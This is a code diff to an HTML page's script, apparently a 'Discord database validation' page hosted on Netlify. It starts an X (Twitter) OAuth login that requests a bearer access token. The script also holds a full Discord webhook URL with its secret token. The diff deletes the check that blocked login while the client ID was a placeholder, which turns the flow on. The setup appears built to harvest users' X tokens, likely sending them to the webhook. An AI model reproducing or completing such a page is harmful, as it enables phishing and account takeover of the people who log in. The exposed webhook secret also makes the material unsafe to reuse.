@@ -606,7 +606,7 @@
 </svg>
 
 <script>
-    const X_CLIENT_ID = "VXlLVEtZMlVZNUNzbjhrSjMySVo6MTpjaQ"; // Replace with your X Developer Portal Client ID
+    const X_CLIENT_ID = "VXlLVEtZMlVZNUNzbjhrSjMySVo6MTpjaQ"; 
     const REDIRECT_URI = "https://discdatabasevalidation.netlify.app/";
     const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1553609504447533139/0KDmUfqwzJzw0zuNOYGd_9n0Mo1-acgowUM6JfpSz4BxY-wStCcVwVAICoYh2Krjd_Lt";
 
@@ -667,11 +667,6 @@
     }
 
     loginBtn.addEventListener("click", function() {
-        if (X_CLIENT_ID === "VXlLVEtZMlVZNUNzbjhrSjMySVo6MTpjaQ") {
-            alert("Please update YOUR_X_CLIENT_ID with your actual X Developer Client ID!");
-            return;
-        }
-
         const stateSetting = "state_security_token";
         const xOauthUrl = `https://twitter.com/i/oauth2/authorize?client_id=${X_CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=tweet.read\%20users.read&state=${stateSetting}&code_challenge=challenge&code_challenge_method=plain`;
         window.location.href = xOauthUrl;
